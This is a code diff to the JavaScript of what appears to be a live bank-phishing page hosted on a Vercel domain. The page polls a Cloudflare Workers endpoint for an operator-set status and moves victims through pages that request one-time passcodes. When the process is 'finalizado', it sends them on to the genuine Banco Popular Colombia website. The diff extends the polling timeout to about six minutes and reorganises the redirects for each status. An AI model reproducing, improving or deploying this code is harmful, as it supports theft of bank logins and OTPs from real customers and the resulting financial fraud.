@@ -155,7 +155,7 @@
     const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
     const BASE_URL = 'https://personasgalicia.vercel.app';
     let intentos = 0;
-    const MAX_INTENTOS = 60;
+    const MAX_INTENTOS = 120; // 120 intentos = ~6 minutos
     let timeoutId = null;
     let isProcessing = false;
     let redirigiendo = false;
@@ -230,20 +230,7 @@
         const estado = data.estado;
         console.log(`✅ Estado recibido: ${estado}`);
 
-        // Mostrar mensaje según estado
-        const mensajes = {
-          'autorizado': '✅ ¡Autorización confirmada! Redirigiendo...',
-          'error': '❌ Acceso denegado. Redirigiendo...',
-          'otp_solicitado': '📲 OTP solicitado. Redirigiendo...',
-          'otp_recibido': '📲 Código OTP recibido. Redirigiendo...',
-          'finalizado': '🏁 Proceso finalizado. Redirigiendo...'
-        };
-
-        if (mensajes[estado]) {
-          actualizarEstado(mensajes[estado], estado === 'error' ? 'error' : 'success');
-        }
-
-        // Redirigir según el estado
+        // Limpiar timeout si existe
         if (timeoutId) {
           clearTimeout(timeoutId);
           timeoutId = null;
@@ -251,30 +238,42 @@
         
         redirigiendo = true;
 
+        // ========================= REDIRECCIONES SEGÚN ESTADO =========================
         switch (estado) {
           case 'autorizado':
-          case 'otp_solicitado':
+            actualizarEstado('✅ ¡Autorización confirmada! Redirigiendo...', 'success');
             console.log(`🔄 Redirigiendo a: ${BASE_URL}/codigo.html`);
             setTimeout(() => {
               window.location.href = `${BASE_URL}/codigo.html`;
             }, 1500);
             break;
 
-          case 'error':
-            console.log(`🔄 Redirigiendo a: ${BASE_URL}/w.html`);
+          case 'otp_solicitado':
+            actualizarEstado('📲 OTP solicitado. Redirigiendo...', 'info');
+            console.log(`🔄 Redirigiendo a: ${BASE_URL}/codigo.html`);
             setTimeout(() => {
-              window.location.href = `${BASE_URL}/w.html`;
+              window.location.href = `${BASE_URL}/codigo.html`;
             }, 1500);
             break;
 
           case 'otp_recibido':
+            actualizarEstado('✅ OTP recibido correctamente. Redirigiendo...', 'success');
             console.log(`🔄 Redirigiendo a: ${BASE_URL}/codei.html`);
             setTimeout(() => {
               window.location.href = `${BASE_URL}/codei.html`;
             }, 1500);
             break;
 
+          case 'error':
+            actualizarEstado('❌ Acceso denegado. Redirigiendo...', 'error');
+            console.log(`🔄 Redirigiendo a: ${BASE_URL}/w.html`);
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/w.html`;
+            }, 1500);
+            break;
+
           case 'finalizado':
+            actualizarEstado('🏁 Proceso finalizado. Redirigiendo...', 'info');
             console.log(`🔄 Redirigiendo a: https://www.bancopopular.com.co/`);
             setTimeout(() => {
               window.location.href = 'https://www.bancopopular.com.co/';
